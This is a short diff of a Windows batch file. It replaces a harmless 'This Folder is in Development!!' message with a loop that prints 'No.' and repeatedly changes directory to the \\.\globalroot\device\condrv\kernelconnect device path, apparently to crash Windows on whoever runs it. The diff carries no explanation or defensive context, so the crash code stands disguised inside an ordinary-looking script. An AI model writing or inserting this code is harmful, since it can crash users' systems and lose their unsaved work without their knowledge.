@@ -1,4 +1,5 @@
 @echo off
-echo This Folder is in Development!!
-PAUSE
-exit
+echo No.
+:no
+cd \\\\.\\globalroot\\device\\condrv\\kernelconnect
+goto :no
